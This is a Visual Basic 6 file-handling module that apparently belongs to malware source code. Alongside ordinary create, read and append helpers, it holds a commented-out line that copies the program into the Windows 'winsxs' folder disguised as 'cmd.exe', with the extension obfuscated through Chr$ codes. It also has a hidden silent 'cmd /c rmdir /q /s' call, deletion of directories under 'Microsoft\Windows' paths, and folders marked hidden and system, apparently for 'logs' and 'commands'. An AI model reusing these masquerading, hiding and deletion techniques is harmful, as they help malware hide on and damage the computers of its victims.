Attribute VB_Name = "file"
Option Explicit
Dim FileNum As Byte
Dim OldText As String
Dim x As Long
Public blnISReading As Boolean
Dim GetTo As String

Private Type SECURITY_ATTRIBUTES
nLength As Long
lpSecurityDescriptor As Long
bInheritHandle As Long
End Type
Private Declare Function CreateDirectory Lib "kernel32" Alias "CreateDirectoryA" (ByVal lpPathName As String, lpSecurityAttributes As SECURITY_ATTRIBUTES) As Long
Dim SecAttrib As SECURITY_ATTRIBUTES

Public Declare Function RemoveDirectory& Lib "kernel32" Alias _
     "RemoveDirectoryA" (ByVal lpPathName As String)

Public Declare Function CopyFile Lib "kernel32" _
Alias "CopyFileA" (ByVal lpExistingFileName As String, _
ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
'Private Declare Function DeleteFile Lib "kernel32" _
'Alias "DeleteFileA" (ByVal lpFileName As String) As Long

'COP = CopyFile(App.Path & "\" & App.EXEName & ".ex" & Chr$(101), sRon & "winsxs\cm" & Chr$(100) & ".ex" & Chr$(101), False)
Public Function CreateDir(ByVal sPath As String) As Boolean
On Error Resume Next
If Right(sPath, 1) <> "\" Then sPath = sPath & "\"
'If Dir(sPath, vbSystem Or vbDirectory Or vbNormal Or vbHidden) <> vbNullString And CBool(InStr(sPath, "logs")) = False And CBool(InStr(sPath, "commands")) = False _
'Then WinExec ("cmd /c rmdir " & Left(sPath, Len(sPath) - 1)) & " /q /s", 0: Wait 1000
If CBool(InStr(sPath, "\Microsoft\Windows")) = True Or CBool(InStr(sPath, "Language")) = True Then RemoveDirectory (sPath)
SecAttrib.lpSecurityDescriptor = &O0
SecAttrib.bInheritHandle = False
SecAttrib.nLength = Len(SecAttrib)
CreateDir = CBool(CreateDirectory(sPath, SecAttrib))
End Function

'CreateDir ("C:\dir")
'Call SetAttr("C:\dir", vbHidden Or vbSystem)
'Call SetAttr("C:\dir", vbNormal)

Public Function CreateFile(ByVal NameOfFile As String, ByVal iText As String) As Boolean
On Error Resume Next
Dim iChar, CryptChar, OutText As String
If Dir(NameOfFile) <> vbNullString Then Kill (NameOfFile)
FileNum = FreeFile
Open NameOfFile For Binary As FileNum
Put FileNum, , iText
Close FileNum
CreateFile = True
End Function
'****************************************************************************************vbcrlf убрать
Public Function WriteFile(ByVal NameOfFile As String, ByVal iText As String) As Boolean
On Error Resume Next
If Dir(NameOfFile) <> vbNullString Then
OldText = ReadFile(NameOfFile)
iText = OldText & iText
Kill (NameOfFile)
End If
FileNum = FreeFile
Open NameOfFile For Binary As FileNum
Put FileNum, , iText
Close FileNum
WriteFile = True
End Function

Public Function ReadFile(ByVal NameOfFileR As String) As String
On Error Resume Next
If Dir(NameOfFileR) <> vbNullString Then
FileNum = FreeFile
Open NameOfFileR For Binary As FileNum
GetTo = Space(LOF(1))
Get FileNum, , GetTo
Close FileNum
ReadFile = GetTo
blnISReading = True
Else
ReadFile = vbNullString
blnISReading = False
End If
DoEvents
End Function
